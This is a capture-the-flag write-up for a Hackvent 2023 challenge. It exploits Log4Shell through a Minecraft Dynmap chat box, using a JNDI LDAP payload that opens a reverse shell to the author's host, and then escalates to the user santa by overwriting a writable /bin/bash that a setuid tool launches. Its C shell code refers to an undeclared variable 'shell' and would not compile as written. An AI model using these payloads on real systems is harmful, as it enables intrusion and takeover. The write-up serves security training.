# [HV23.19] Santa's Minecraft Server

## Introduction

Difficulty: Hard<br>
Author: nichtseb

Santa likes to play minecraft. His favorite version is 1.16. For security reasons, the server is not publicly accessible. But Santa is a little show-off, so he has an online map to brag about his fabulous building skills.

## Solution

Minecraft + Hackvent, hell yeah.

The description of the challenge tells us that the server is running on Minecraft 1.16, a pretty old version, the server itself is not accessible tho, only a Webinterface called [Dynmap](https://github.com/webbukkit/dynmap) is.

As we open up the Webinterface, we can see a chat-box. User supplied input + old Java? This screams Log4j.

First Log4j Shell exploit from the google results: https://github.com/kozmer/log4j-shell-poc

Start using: `python3 poc.py --userip 10.13.0.14 --webport 8888 --lport 4444`

Open a listener using: `nc -nvlp 4444`

Put the following into the chat-box: `${jndi:ldap://10.13.0.14:1389/a}`

Now we have a reverse shell, looking at `/` we can see a folder called `santas-workshop` which has two files `tool` and `tool.c` inside.

Looking at `tool` shows it has the `setuid` and `setgid` bits set, `tool.c` cotains the source code:

```c
cat tool.c
#include <unistd.h>
#include <stdio.h>

void debugShell() {
	printf("Launching debug shell...\n");
	char *argv[] = { "/bin/bash", 0 };
	execve(argv[0], &argv[0], NULL);
}

void main() {
	printf("--- Santas Workshop Tool ---\n");
	printf("Pick an action:\n");
	printf("s) debug shell\n");
	printf("-- more options to come\n");

	char option;
	scanf("%c", &option);

	switch (option) {
	case 's': debugShell(); break;
	default: printf("Unknonwn option!\n"); break;
	}
}
```

This does work to give us a debug shell, but it is missing the `-p` parameter, looking at `/bin/bash` shows us that it is writeable, how nice of the author.

After quickly writing a shell in C and compiling it using `gcc` we can copy it to `/bin/bash`.

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", "-p", NULL};
    execve(shell, args, NULL);
    return 0;
}
```

We can write this program to a file using a single line with `printf`:

`printf "#include <stdio.h>\n#include <unistd.h>\n\nint main() {\n    char *args[] = {\"/bin/sh\", \"-p\", NULL};\n\n    execve(shell, args, NULL);\n    \n    return 0;\n}\n" > shell.c`

Compile using: `gcc shell.c -o shell`

Overwrite bash: `cp shell /bin/bash`

Now for some reason, I had to `cd` into `/santas-workshop` before running `./tool` and supplying `s`, now we have a shell as `santa`

`cat /home/santa/flag.txt` reveals the flag.

Flag: `HV23{d0n7_f0rg37_70_upd473_k1d5}`